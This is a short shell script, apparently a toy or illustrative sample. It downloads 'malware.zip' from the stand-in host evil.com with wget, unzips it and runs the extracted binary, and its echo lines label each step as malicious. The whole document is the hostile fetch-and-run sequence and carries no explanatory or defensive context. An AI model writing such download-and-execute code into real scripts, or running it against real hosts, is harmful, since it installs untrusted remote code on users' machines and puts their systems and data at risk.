#!/bin/sh

echo "Downloading malicious file..."
wget https://evil.com/malware.zip

echo "Extracting contents of the downloaded file..."
unzip malware.zip

echo "Executing the extracted malware..."
./malware.bin
